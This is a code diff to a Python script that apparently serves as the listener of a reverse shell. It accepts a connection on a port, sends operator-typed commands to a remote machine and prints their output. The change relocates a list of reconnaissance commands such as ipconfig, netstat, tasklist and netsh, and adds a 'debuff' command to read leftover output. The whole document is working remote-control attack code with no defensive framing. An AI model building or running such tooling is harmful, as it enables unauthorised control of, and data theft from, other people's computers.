@@ -50,6 +50,10 @@ print(f"\nstarted listening on port {port}...")
 client_socket, client_addr = s.accept()
 
 print(f"connection made with {str(client_addr)}")
+
+#A list of commands that return information so that I can fix the problem of not being able to use commands that don't return information.
+Data_ret_comm = ["dir", "ls", "ifconfig", "ipconfig", "cat", "echo", "find", "finger", "grep", "groups", "head", "history", "less", "man", "move", "ping", "ps", "pwd", "tail", "uname", "w", "netstat", "route", "net", "tasklist", "getmac","netsh", "help"]
+
 #this is the command execution part
 while True:
     #input and sending the command
@@ -57,10 +61,12 @@ while True:
     client_socket.send(command.encode())
     if command.lower() == "exit":
         break
-    #retrieve response
-    #A list of commands that return information so that I can fix the problem of not being able to use commands that don't return information.
-    Data_ret_comm = ["dir", "ls", "ifconfig", "ipconfig", "cat", "echo", "find", "finger", "grep", "groups", "head", "history", "less", "man", "move", "ping", "ps", "pwd", "tail", "uname", "w", "netstat", "route", "net", "tasklist", "getmac","netsh", "help"]
-    if command.split()[0] in Data_ret_comm:
+    #A command to retrieve any residual buffer overflow or none-listed info returning commands
+    elif command.lower() == "debuff":
+        response = client_socket.recv(buffer).decode()
+        print(response)
+    #retrieve response from commands that output text
+    elif command.split()[0] in Data_ret_comm:
         response = client_socket.recv(buffer).decode()
         print(response)
 client_socket.close()
